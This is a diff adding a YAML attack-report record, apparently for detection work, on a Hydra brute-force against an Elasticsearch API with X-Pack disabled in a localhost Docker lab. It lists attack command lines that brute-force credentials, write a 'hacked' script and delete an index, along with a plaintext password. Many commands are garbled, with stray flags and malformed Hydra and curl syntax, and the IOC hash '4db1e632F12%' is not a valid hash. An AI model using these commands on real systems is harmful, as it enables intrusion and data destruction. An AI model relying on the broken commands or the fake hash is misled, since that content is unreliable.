@@ -1,0 +1,56 @@
+description: This report details a successful authentication brute-force attack against
+  an Elasticsearch API using Hydra. The vulnerability stems from the X-Pack plugin
+  being disabled, exposing sensitive data and allowing unauthorized modifications.
+date: '2025-03-19'
+authors:
+- Karl Biron
+attribution: Unknown (likely opportunistic attacker)
+TTPs:
+  processes:
+  - curl
+  - docker
+  - bash
+  commandline:
+  - curl -o /dev/null http://localhost:9200
+  - 'curl -X PUT http://localhost:9200/secrets - Content-Type: application/json'
+  - 'for i in $(seq 1 3); do echo Adding data to the secrets! index...; curl -X POST
+    http://localhost:9200/secrets/_doc - "Content-Type: application/json\\n\\\"username\\\":
+    \\"usersiv\\"\\",\\"password\\": \\"password1\\""; done'
+  - docker run -d --name elasticsearch-xpack -p 9200:9200 -p 9300:9300 -e discovery.type=single-node
+    - "ELASTIC_PASSWORD=StrongPassword123" -v ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml
+    - docker.elastic.co/elasticsearch/elasticsearch:8.17.0
+  - ./initialize.sh /usr/share/elasticsearch/initialize.sh
+  - curl -s X GET http://localhost:9200/cluster/health -u elastic:StrongPassword123
+  - curl -s X GET "http://localhost:9200/secrets/_search" | jq
+  - 'curl -s -X POST http://localhost:9200/scripts/payload - Content-Type: application/json
+    -script: {lang: painless,source: ctx.source.field \\\"hacked\\\"}'
+  - curl -s -X DELETE http://localhost:9200/secrets
+  - sudo docker run -d --name elasticsearch-xpack --p 9200:9200 --p 9300:9300 --e
+    discovery.type=single-node -- "ELASTIC_PASSWORD=StrongPassword123" --v ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml
+    - docker.elastic.co/elasticsearch/elasticsearch:8.17.0
+  - curl -s -X GET http://localhost:9200
+  - hydra -1 elastic -P StrongPassword123 -t 5 9200 localhost http-get /security/authenticate
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl
+    destination_address: localhost
+    port: '9200'
+  - executable: hydra
+    destination_address: localhost
+    port: '9200'
+  file_modifications:
+  - /usr/share/elasticsearch/config/elasticsearch.yml
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: 4db1e632F12%
+- ip: localhost
+- port: '9200'
+- username: elastic
+- password: StrongPassword123
+reference: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/fort-knox-for-your-data-how-elasticsearch-x-pack-locks-down-your-cluster-part-1/
+file_creation_date: May 14, 2025
